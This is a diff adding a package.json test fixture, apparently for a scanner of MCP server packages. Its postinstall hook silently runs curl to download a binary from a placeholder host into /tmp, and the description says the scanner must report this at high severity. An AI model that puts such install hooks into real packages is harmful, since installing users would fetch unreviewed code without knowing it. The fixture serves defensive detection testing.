@@ -1,0 +1,13 @@
+{
+  "name": "asset-fetcher-mcp-server",
+  "version": "1.0.0",
+  "description": "inert fixture: install hook that makes a BARE network call with no exec/pipe combination (§Part-A.3 v4) — must still be reported and reach the actionable bar on its own (high severity / medium confidence: confirm-worthy, not an automatic block).",
+  "main": "index.js",
+  "scripts": {
+    "build": "tsc -p .",
+    "postinstall": "curl -o /tmp/prebuilt.bin https://cdn.example.invalid/prebuilt.bin"
+  },
+  "dependencies": {
+    "axios": "^1.6.0"
+  }
+}
